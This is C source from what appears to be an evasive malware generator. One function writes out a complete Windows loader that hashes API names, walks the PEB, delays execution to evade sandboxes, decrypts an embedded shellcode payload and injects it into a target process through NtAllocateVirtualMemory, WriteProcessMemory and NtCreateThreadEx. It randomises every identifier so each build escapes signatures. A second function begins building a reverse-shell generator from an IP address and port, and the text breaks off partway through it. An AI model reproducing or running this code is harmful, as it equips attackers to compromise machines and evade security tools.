    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pWriteProcessMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pCreateToolhelp32Snapshot_name[9], pProcess32First_name[9], pProcess32Next_name[9];
    char pOpenProcess_name[9], plstrcmpiA_name[9], pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pWriteProcessMemory_name, sizeof(pWriteProcessMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pCreateToolhelp32Snapshot_name, sizeof(pCreateToolhelp32Snapshot_name));
    generate_random_string(pProcess32First_name, sizeof(pProcess32First_name));
    generate_random_string(pProcess32Next_name, sizeof(pProcess32Next_name));
    generate_random_string(pOpenProcess_name, sizeof(pOpenProcess_name));
    generate_random_string(plstrcmpiA_name, sizeof(plstrcmpiA_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char writeprocessmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11], createtoolhelp32snapshot_hash_name[11];
    char process32first_hash_name[11], process32next_hash_name[11], openprocess_hash_name[11];
    char lstrcmpiA_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(writeprocessmemory_hash_name, sizeof(writeprocessmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));
    generate_random_string(createtoolhelp32snapshot_hash_name, sizeof(createtoolhelp32snapshot_hash_name));
    generate_random_string(process32first_hash_name, sizeof(process32first_hash_name));
    generate_random_string(process32next_hash_name, sizeof(process32next_hash_name));
    generate_random_string(openprocess_hash_name, sizeof(openprocess_hash_name));
    generate_random_string(lstrcmpiA_hash_name, sizeof(lstrcmpiA_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], WriteProcessMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char CreateToolhelp32Snapshot_typedef[12], Process32First_typedef[12], Process32Next_typedef[12];
    char OpenProcess_typedef[12], lstrcmpiA_typedef[12], NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(WriteProcessMemory_typedef, sizeof(WriteProcessMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(CreateToolhelp32Snapshot_typedef, sizeof(CreateToolhelp32Snapshot_typedef));
    generate_random_string(Process32First_typedef, sizeof(Process32First_typedef));
    generate_random_string(Process32Next_typedef, sizeof(Process32Next_typedef));
    generate_random_string(OpenProcess_typedef, sizeof(OpenProcess_typedef));
    generate_random_string(lstrcmpiA_typedef, sizeof(lstrcmpiA_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Random names for additional functions
    char random_rc4guard_func[10], random_findtarget_func[10];
    char random_initialize_func[10], random_start_func[10], random_run_func[10];
    char random_hacked_func[10], random_dllmain_func[10];
    char random_hashstring_func[10], random_memcpy_func[10], random_mymalloc_func[10];

    generate_random_string(random_rc4guard_func, sizeof(random_rc4guard_func));
    generate_random_string(random_findtarget_func, sizeof(random_findtarget_func));
    generate_random_string(random_initialize_func, sizeof(random_initialize_func));
    generate_random_string(random_start_func, sizeof(random_start_func));
    generate_random_string(random_run_func, sizeof(random_run_func));
    generate_random_string(random_hacked_func, sizeof(random_hacked_func));
    generate_random_string(random_dllmain_func, sizeof(random_dllmain_func));
    generate_random_string(random_hashstring_func, sizeof(random_hashstring_func));
    generate_random_string(random_memcpy_func, sizeof(random_memcpy_func));
    generate_random_string(random_mymalloc_func, sizeof(random_mymalloc_func));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI* %s)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* %s)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* %s)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "#define %s                      0x5251037A\n"
        "#define %s                   0xA5E086A2\n"
        "#define %s    0x0B37D3B9\n"
        "#define %s    0x54256ED5\n"
        "#define %s    0xCB42C5A9\n"
        "#define %s    0x61D8C71D\n"
        "#define %s    0x1236E2D7\n"
        "#define %s    0xF20D7F2A\n"
        "#define %s    0xA4E3F108\n"
        "#define %s    0xB9D893EC\n"
        "#define %s    0x5D3C1742\n"
        "#define %s    0xA00889BE\n"
        "#define %s    0x35DB6F55\n"
        "#define %s    0x2007BE63\n"
        "#define %s    0xC9B81F21\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char aze[] = {%s};\n"
        "char gtd[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "int %s(void) {\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress) return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n"
        "CHAR %s(CHAR C) {\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* %s(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0;\n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD %s(_In_ LPCSTR String) {\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (%s((PCHAR) API))\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0) return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;\n"
        "    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0) return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL %s(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE b = 0;\n"
        "    INT i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)%s(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey) return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte) break;\n"
        "        else b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char poi[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)aze, sizeof(aze), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(poi), aze);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T len = sizeof(%s);\n"
        "int %s(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = p%s(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!p%s(hProcSnap, &pe32)) {\n"
        "        p%s(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (p%s(hProcSnap, &pe32)) {\n"
        "        if (p%s(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    p%s(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int %s(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID address = NULL;\n"
        "    HANDLE hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    p%s(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    p%s(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE sdfg = %s(%s);\n"
        "    HMODULE vgbh = %s(%s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "    p%s = (%s)%s(vgbh, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "    p%s = (%s)%s(sdfg, %s);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "    int pid = 0;\n"
        "    %s((char*)gtd, sizeof(gtd), xkey, sizeof(xkey)); \n"
        "    pid = %s(gtd);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = p%s(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            %s(HINT_BYTE, %s, %s, sizeof(%s), sizeof(%s));\n"
        "            %s(hProc, %s, len);\n"
        "            p%s(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        CreateToolhelp32Snapshot_typedef,
        Process32First_typedef,
        Process32Next_typedef,
        OpenProcess_typedef,
        lstrcmpiA_typedef,
        NtAllocateVirtualMemory_typedef,
        WriteProcessMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        GetProcAddress_typedef,
        NtDelayExecution_typedef,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        writeprocessmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        createtoolhelp32snapshot_hash_name,
        process32first_hash_name,
        process32next_hash_name,
        openprocess_hash_name,
        lstrcmpiA_hash_name,
        random_obf_func,
        xkey,
        obfuscated_fun,
            Remotprocess,

        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name,
        WriteProcessMemory_typedef, pWriteProcessMemory_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name,
        NtClose_typedef, pNtClose_name,
        CreateToolhelp32Snapshot_typedef, pCreateToolhelp32Snapshot_name,
        Process32First_typedef, pProcess32First_name,
        Process32Next_typedef, pProcess32Next_name,
        OpenProcess_typedef, pOpenProcess_name,
        lstrcmpiA_typedef, plstrcmpiA_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        random_toUpper_name,
        random_mymalloc_func,
        random_hashstring_func,
        random_hashstring_func,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_rc4guard_func,
        random_mymalloc_func,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray,
        hint,
        random_payload_name,
        random_findtarget_func,
        pCreateToolhelp32Snapshot_name,
        pProcess32First_name,
        pNtClose_name,
        pProcess32Next_name,
        plstrcmpiA_name,
        pNtClose_name,
        random_inject_func,
        pNtAllocateVirtualMemory_name,
        pWriteProcessMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_initialize_func,
        random_getmodule_name, ntdll_hash_name,
        random_getmodule_name, kernel32_hash_name,
        pCreateToolhelp32Snapshot_name, CreateToolhelp32Snapshot_typedef, random_getproc_name, createtoolhelp32snapshot_hash_name,
        pProcess32First_name, Process32First_typedef, random_getproc_name, process32first_hash_name,
        pProcess32Next_name, Process32Next_typedef, random_getproc_name, process32next_hash_name,
        pOpenProcess_name, OpenProcess_typedef, random_getproc_name, openprocess_hash_name,
        plstrcmpiA_name, lstrcmpiA_typedef, random_getproc_name, lstrcmpiA_hash_name,
        pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        pWriteProcessMemory_name, WriteProcessMemory_typedef, random_getproc_name, writeprocessmemory_hash_name,
        pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_start_func,
        random_initialize_func,
        random_obf_func,
        random_findtarget_func,
        pOpenProcess_name,
        random_rc4guard_func, random_key_name, random_payload_name, random_key_name, random_payload_name,
        random_inject_func, random_payload_name,
        pNtClose_name,
        random_delay_func,
        random_start_func
    );
}




//================================================================================================================================================================//
// obfuscated code without deley
//================================================================================================================================================================//
void obf_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10], random_delay_func[10];
    char random_connect_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_connect_func, sizeof(random_connect_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15], random_iatcamouflage_name[8];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], pinet_pton_name[9];
    char phtons_name[9], pconnect_name[9], pclosesocket_name[9];
    char pWSACleanup_name[9], pCreateProcessA_name[9], pNtWait_name[9];
    char pNtDelay_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(pinet_pton_name, sizeof(pinet_pton_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pconnect_name, sizeof(pconnect_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtDelay_name, sizeof(pNtDelay_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], inet_pton_hash_name[12];
    char htons_hash_name[10], connect_hash_name[11], closesocket_hash_name[11];
    char wsacleanup_hash_name[13], createprocessa_hash_name[15], ntwait_hash_name[14];
    char ntdelay_hash_name[8], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(inet_pton_hash_name, sizeof(inet_pton_hash_name));
